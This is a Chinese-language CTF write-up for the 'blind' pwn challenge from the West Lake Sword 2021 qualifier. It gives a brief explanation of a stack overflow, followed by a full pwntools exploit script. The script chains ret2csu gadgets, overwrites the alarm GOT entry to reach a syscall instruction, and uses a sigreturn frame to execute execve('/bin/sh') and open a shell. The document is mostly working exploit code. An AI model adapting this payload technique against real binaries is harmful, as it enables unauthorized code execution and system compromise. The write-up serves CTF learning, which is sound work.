---
layout: article
pageview: true
key: 2021-12-10-xihulunjian2021-pwn-wp
title: 西湖论剑2021初赛Pwn题WP
author: Ch4rc0al
categories:
  - WriteUps 
tags: 
  - Pwn
  - CTF
---



# 西湖论剑2021初赛Pwn题WP



<!--more-->



## blind

主函数内一个栈溢出，没有开`PIE`，可利用函数只有`alarm`,`sleep`,`read`，结尾`return read(xxx)`，考虑`srop`，我们在`bss`段写下`/bin/sh`字符串，修改`alarm`函数的got表地址后一位为`0x?5`将其改为`syscall`，在栈上布置`Sigreturn frame`，内容为执行`execve('/bin/sh',0,0)`，在read里输入`0xf`个字符调用`signal return`，完成getshell。

代码写的很难看，请见谅

```python
from pwn import *

context(os='linux',arch='amd64',log_level='debug')

p=process('./blind')

debug=1

elf=ELF('./blind')
p_rdi=0x00000000004007c3
p_rsi_r15=0x00000000004007c1
call_rax=0x00000000004006ae
main=0x4006b6
bss=elf.bss()+0x100
pad='\x00'*0x58

def csu(call,rdi,rsi,rdx,ret):
    csu_end=0x4007ba
    csu_front=0x4007a0
    payload=pad+p64(csu_end)+p64(0)+p64(1)+p64(call)+p64(rdx)+p64(rsi)+p64(rdi)+p64(csu_front)+'\x00'*0x38+p64(ret)
    return payload

sigframe=SigreturnFrame()
sigframe.rax=constants.SYS_execve
sigframe.rsp=bss+0x100
sigframe.rdi=bss
sigframe.rsi=0
sigframe.rdx=0
sigframe.rip=elf.plt['alarm']

gdb.attach(p,'b read')

pay=csu(elf.got['read'],0,bss,0x8,main).ljust(0x500,'\x00')

p.send(pay)

p.send('/bin/sh\x00')

pay=(csu(elf.got['read'],0,elf.got['alarm'],0x1,0xdeadbeaf)[:-8]+csu(elf.got['read'],0,bss+0x100,0xf,elf.plt['alarm'])[0x58:]+str(sigframe)).ljust(0x500,'\x00')

p.send(pay)

p.send('\x15')

p.send('\x00'*15)

p.interactive()
```

